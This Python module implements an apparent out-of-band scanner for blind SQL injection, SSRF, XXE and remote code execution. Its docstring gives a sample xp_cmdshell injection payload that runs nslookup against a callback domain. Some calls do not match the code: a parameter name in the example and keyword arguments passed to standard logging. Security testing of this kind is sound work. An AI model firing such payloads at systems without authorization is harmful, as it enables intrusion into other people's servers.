"""
VORTEX Out-of-Band (OOB) Detection System - V18.0
Burp Collaborator-style blind vulnerability detection

CAPABILITIES:
- HTTP callback monitoring (interactsh.com-style)
- DNS callback detection (optional)
- Blind SQLi detection
- Blind SSRF detection
- XXE out-of-band exploitation
- Remote code execution verification

ARCHITECTURE:
- Callback URL generation with unique tokens
- Async callback server for HTTP/DNS
- Correlation engine for matching callbacks to tests
- Evidence collection and verification

CRITICAL: All OOB tests must have clear consent and scope validation
"""

import asyncio
import hashlib
import logging
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Dict, Optional, List, Any, Set
from urllib.parse import urljoin, quote

logger = logging.getLogger(__name__)


@dataclass
class OOBCallback:
    """Represents an out-of-band callback received."""
    token: str  # Unique token identifying the test
    callback_type: str  # 'http', 'dns', 'smtp'
    source_ip: str
    timestamp: datetime
    
    # HTTP-specific
    method: Optional[str] = None
    path: Optional[str] = None
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    
    # DNS-specific
    query_type: Optional[str] = None
    query_name: Optional[str] = None
    
    # Metadata
    user_agent: Optional[str] = None
    raw_data: Optional[str] = None


@dataclass
class OOBTest:
    """Represents an OOB test configuration."""
    test_id: str
    token: str
    vulnerability_type: str  # 'blind_sqli', 'blind_ssrf', 'xxe', 'rce'
    target_url: str
    payload: str
    callback_url: str
    created_at: datetime = field(default_factory=datetime.utcnow)
    expires_at: Optional[datetime] = None
    
    # Results
    callbacks_received: List[OOBCallback] = field(default_factory=list)
    verified: bool = False
    verification_time: Optional[datetime] = None


class OOBDetector:
    """
    Out-of-band vulnerability detector.
    
    WORKFLOW:
    1. Generate unique callback URL with token
    2. Inject payload with callback URL
    3. Monitor for callbacks
    4. Correlate callbacks to tests
    5. Verify vulnerability
    
    EXAMPLE:
        detector = OOBDetector()
        await detector.start()
        
        # Test blind SQLi
        test = detector.create_test(
            vulnerability_type='blind_sqli',
            target_url='https://example.com/api',
            payload="'; EXEC xp_cmdshell('nslookup TOKEN.oob.vortex.local')--"
        )
        
        # Wait for callback
        await asyncio.sleep(10)
        
        # Check results
        if test.verified:
            print(f"Vulnerability confirmed! Callback received from {test.callbacks_received[0].source_ip}")
    """
    
    def __init__(self, 
                 callback_domain: str = "oob.vortex.local",
                 callback_port: int = 8080,
                 callback_timeout: int = 30):
        """
        Initialize OOB detector.
        
        Args:
            callback_domain: Domain for callbacks (e.g., oob.vortex.local)
            callback_port: Port for HTTP callback server
            callback_timeout: Timeout in seconds for callback wait
        """
        self.callback_domain = callback_domain
        self.callback_port = callback_port
        self.callback_timeout = callback_timeout
        
        # Active tests (token → test)
        self.active_tests: Dict[str, OOBTest] = {}
        
        # Callback history
        self.callback_history: List[OOBCallback] = []
        
        # Server reference
        self.callback_server = None
        self._server_task = None
        
        # Statistics
        self.stats = {
            'tests_created': 0,
            'callbacks_received': 0,
            'vulnerabilities_verified': 0,
            'http_callbacks': 0,
            'dns_callbacks': 0,
            'timeouts': 0
        }
    
    async def start(self):
        """Start OOB detection system."""
        logger.info("Starting OOB detection system")
        
        # Import callback server
        from core.detection.callback_server import CallbackServer
        
        self.callback_server = CallbackServer(
            host='0.0.0.0',
            port=self.callback_port,
            detector=self
        )
        
        # Start server in background
        self._server_task = asyncio.create_task(
            self.callback_server.start()
        )
        
        logger.info(f"OOB callback server started on port {self.callback_port}")
    
    async def stop(self):
        """Stop OOB detection system."""
        logger.info("Stopping OOB detection system")
        
        if self.callback_server:
            await self.callback_server.stop()
        
        if self._server_task:
            self._server_task.cancel()
            try:
                await self._server_task
            except asyncio.CancelledError:
                pass
        
        logger.info("OOB detection system stopped")
    
    def create_test(self,
                   vulnerability_type: str,
                   target_url: str,
                   payload_template: str) -> OOBTest:
        """
        Create OOB test with unique callback URL.
        
        Args:
            vulnerability_type: Type of vulnerability being tested
            target_url: Target URL
            payload_template: Payload template with {CALLBACK_URL} placeholder
            
        Returns:
            OOBTest object
        """
        self.stats['tests_created'] += 1
        
        # Generate unique token
        test_id = str(uuid.uuid4())
        token = self._generate_token(test_id)
        
        # Generate callback URL
        callback_url = self._generate_callback_url(token)
        
        # Replace placeholder in payload
        payload = payload_template.replace('{CALLBACK_URL}', callback_url)
        payload = payload.replace('{TOKEN}', token)
        
        # Create test
        test = OOBTest(
            test_id=test_id,
            token=token,
            vulnerability_type=vulnerability_type,
            target_url=target_url,
            payload=payload,
            callback_url=callback_url,
            expires_at=datetime.utcnow() + timedelta(seconds=self.callback_timeout)
        )
        
        # Register test
        self.active_tests[token] = test
        
        logger.info(
            f"Created OOB test: {vulnerability_type}",
            test_id=test_id,
            token=token,
            callback_url=callback_url
        )
        
        return test
    
    async def wait_for_callback(self, 
                                test: OOBTest,
                                timeout: Optional[int] = None) -> bool:
        """
        Wait for callback from OOB test.
        
        Args:
            test: OOB test to wait for
            timeout: Timeout in seconds (default: self.callback_timeout)
            
        Returns:
            True if callback received, False if timeout
        """
        timeout = timeout or self.callback_timeout
        start_time = datetime.utcnow()
        
        logger.info(f"Waiting for callback (token={test.token}, timeout={timeout}s)")
        
        while (datetime.utcnow() - start_time).total_seconds() < timeout:
            # Check if callback received
            if test.callbacks_received:
                test.verified = True
                test.verification_time = datetime.utcnow()
                self.stats['vulnerabilities_verified'] += 1
                
                logger.info(
                    f"Callback received for {test.token}",
                    source_ip=test.callbacks_received[0].source_ip,
                    verification_time=(test.verification_time - test.created_at).total_seconds()
                )
                
                return True
            
            # Check if test expired
            if test.expires_at and datetime.utcnow() > test.expires_at:
                break
            
            # Wait a bit
            await asyncio.sleep(0.5)
        
        # Timeout
        self.stats['timeouts'] += 1
        logger.warning(f"Callback timeout for {test.token}")
        
        # Cleanup
        self.active_tests.pop(test.token, None)
        
        return False
    
    def register_callback(self, callback: OOBCallback):
        """
        Register received callback.
        
        Called by callback server when callback is received.
        """
        self.stats['callbacks_received'] += 1
        
        if callback.callback_type == 'http':
            self.stats['http_callbacks'] += 1
        elif callback.callback_type == 'dns':
            self.stats['dns_callbacks'] += 1
        
        # Add to history
        self.callback_history.append(callback)
        
        # Find matching test
        test = self.active_tests.get(callback.token)
        
        if test:
            test.callbacks_received.append(callback)
            
            logger.info(
                f"Callback matched to test",
                token=callback.token,
                test_id=test.test_id,
                source_ip=callback.source_ip
            )
        else:
            logger.warning(
                f"Callback received but no matching test",
                token=callback.token
            )
    
    def _generate_token(self, test_id: str) -> str:
        """Generate unique token for test."""
        # Use first 16 chars of SHA256
        hash_obj = hashlib.sha256(test_id.encode())
        return hash_obj.hexdigest()[:16]
    
    def _generate_callback_url(self, token: str) -> str:
        """Generate callback URL with token."""
        # Format: http://TOKEN.oob.vortex.local:8080/callback
        subdomain = f"{token}.{self.callback_domain}"
        return f"http://{subdomain}:{self.callback_port}/callback"
    
    def get_test(self, token: str) -> Optional[OOBTest]:
        """Get test by token."""
        return self.active_tests.get(token)
    
    def get_all_tests(self) -> List[OOBTest]:
        """Get all active tests."""
        return list(self.active_tests.values())
    
    def cleanup_expired_tests(self):
        """Remove expired tests."""
        now = datetime.utcnow()
        expired = [
            token for token, test in self.active_tests.items()
            if test.expires_at and now > test.expires_at
        ]
        
        for token in expired:
            del self.active_tests[token]
        
        if expired:
            logger.info(f"Cleaned up {len(expired)} expired OOB tests")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get OOB detector statistics."""
        return {
            **self.stats,
            'active_tests': len(self.active_tests),
            'callback_history_size': len(self.callback_history)
        }


# Global OOB detector instance
global_oob_detector: Optional[OOBDetector] = None


async def get_oob_detector() -> OOBDetector:
    """Get or create global OOB detector."""
    global global_oob_detector
    
    if global_oob_detector is None:
        global_oob_detector = OOBDetector()
        await global_oob_detector.start()
    
    return global_oob_detector


async def test_blind_vulnerability(
    vulnerability_type: str,
    target_url: str,
    payload_template: str,
    timeout: int = 30
) -> bool:
    """
    High-level function to test for blind vulnerability using OOB.
    
    Args:
        vulnerability_type: Type (e.g., 'blind_sqli', 'blind_ssrf')
        target_url: Target URL
        payload_template: Payload with {CALLBACK_URL} placeholder
        timeout: Callback wait timeout
        
    Returns:
        True if vulnerability verified via callback
    """
    detector = await get_oob_detector()
    
    # Create test
    test = detector.create_test(
        vulnerability_type=vulnerability_type,
        target_url=target_url,
        payload_template=payload_template
    )
    
    # Wait for callback
    verified = await detector.wait_for_callback(test, timeout=timeout)
    
    return verified